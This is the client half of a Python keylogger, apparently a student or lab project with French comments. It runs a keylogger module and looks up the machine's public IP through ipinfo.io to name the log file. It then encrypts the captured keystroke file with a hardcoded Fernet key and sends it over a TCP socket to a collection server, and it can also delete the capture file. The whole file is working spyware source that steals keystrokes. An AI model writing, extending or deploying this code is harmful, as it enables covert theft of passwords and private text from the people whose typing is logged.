import keylogger
import socket
import requests
import time  
import os  
from datetime import datetime
from cryptography.fernet import Fernet


# Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

# Fonction pour lancer le keylogger
def launch_keylogger():
    keylogger.listen_keyboard()

# Fonction pour arrêter le keylogger
def stop_keylogger():
    # Arrêter le keylogger
    keylogger.stop_keylogger()

# Fonction pour arrêter le keylogger et supprimer le fichier de capture
def stop_and_delete_capture_file():
    # Arrêter le keylogger
    stop_keylogger()

    # Supprimer le fichier de capture
    file = ".document1.txt"  # Assurez-vous que c'est le bon chemin
    os.remove(file)
  

# Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
def send_file_securely(server_address, server_port):
    # Créer une socket TCP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
        # Se connecter au serveur
        client_socket.connect((server_address, server_port))

        # Envoyer le nom du fichier au serveur
        filename = get_filename()
        encrypted_message = Fernet(key).encrypt(filename.encode())
        client_socket.send(encrypted_message)

        # Envoyer le contenu du fichier au serveur
        with open(".document1.txt", "r") as file:
            lines = file.read()
            print(lines)
            encrypted_lines = Fernet(key).encrypt(lines.encode())

            client_socket.send(encrypted_lines)

        print("Fichier envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")
    finally:
        # Fermer la connexion
        client_socket.close()


try:
    launch_keylogger()
except KeyboardInterrupt:
    stop_keylogger()
    send_file_securely("127.0.0.1", 1234)
    print("Interruption clavier détectée. Arrêt du keylogger et envoi du fichier.")